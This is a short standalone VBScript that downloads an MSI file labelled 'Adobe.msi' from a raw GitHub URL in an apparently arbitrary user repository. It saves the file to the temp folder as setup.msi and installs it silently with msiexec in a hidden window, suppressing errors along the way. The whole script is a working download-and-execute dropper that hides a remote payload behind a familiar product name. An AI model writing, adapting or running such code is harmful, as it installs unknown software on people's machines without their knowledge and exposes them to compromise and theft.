Dim url, tempPath, http, stream, wsh, rc
Set wsh = CreateObject("WScript.Shell")
tempPath = wsh.ExpandEnvironmentStrings("%TEMP%") & "\setup.msi"
url = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"

On Error Resume Next
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", url, False
http.Send
On Error GoTo 0

If http.Status = 200 Then
    On Error Resume Next
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile tempPath, 2
    stream.Close
    On Error GoTo 0

    If wsh.ExpandEnvironmentStrings("%TEMP%") <> "" Then
        If CreateObject("Scripting.FileSystemObject").FileExists(tempPath) Then
            wsh.Run "msiexec.exe /i """ & tempPath & """ /qn /norestart", 0, True
        End If
    End If
End If
